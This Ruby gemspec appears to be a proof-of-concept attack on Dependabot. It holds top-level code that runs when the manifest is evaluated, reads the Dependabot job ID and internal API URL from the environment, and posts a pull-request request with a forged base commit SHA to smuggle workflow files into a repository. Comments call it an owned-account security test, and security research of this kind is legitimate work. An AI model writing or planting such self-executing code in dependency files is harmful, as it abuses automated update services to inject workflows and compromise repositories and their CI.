# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

# Owned-account security test. This submits one benign Dependabot PR whose
# caller-selected parent is an unattached commit in the same owned repository.
# That parent was built through nested Git tree objects and contains only the
# three controlled workflow-run proof files.
module OwnedDependabotNestedWorkflowScopeProbe
  CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
  FORGED_BASE_SHA = "587c9b05156538ae413fde13bfd8c4185bf11087"
  RAW_PATH = "vendor/owned-dependabot-nested-workflow-scope-control.txt"

  module_function

  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?

    marker = "/tmp/owned-dependabot-nested-workflow-scope-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}

    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate(payload)
    proxy_client(endpoint).request(request)
  rescue Errno::EEXIST
    nil
  rescue StandardError
    nil
  end

  def proxy_client(endpoint)
    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = endpoint.scheme == "https"
    client.open_timeout = 10
    client.read_timeout = 20
    client
  end

  def payload
    requirement = {
      "file" => "Gemfile",
      "requirement" => ">= 0",
      "groups" => [],
      "source" => {
        "type" => "git",
        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
        "branch" => "main",
        "ref" => nil
      }
    }

    {
      "data" => {
        "dependencies" => [{
          "name" => "owned_dependabot_nested_workflow_scope_probe",
          "version" => "0.0.7",
          "previous-version" => "0.0.6",
          "requirements" => [requirement],
          "previous-requirements" => [requirement],
          "directory" => "/"
        }],
        "updated-dependency-files" => [{
          "name" => RAW_PATH,
          "content" => "owned nested-tree workflow scope composition proof\n",
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create"
        }],
        "base-commit-sha" => FORGED_BASE_SHA,
        "commit-message" => "chore: owned nested-tree workflow scope composition proof",
        "pr-title" => "Owned nested-tree workflow scope composition proof",
        "pr-body" => "Owned security test. The explicit update is one benign marker; the three workflow files are inherited solely from the caller-selected parent commit."
      }
    }
  end
end

OwnedDependabotNestedWorkflowScopeProbe.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.7"
  spec.summary = "Owned Dependabot security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
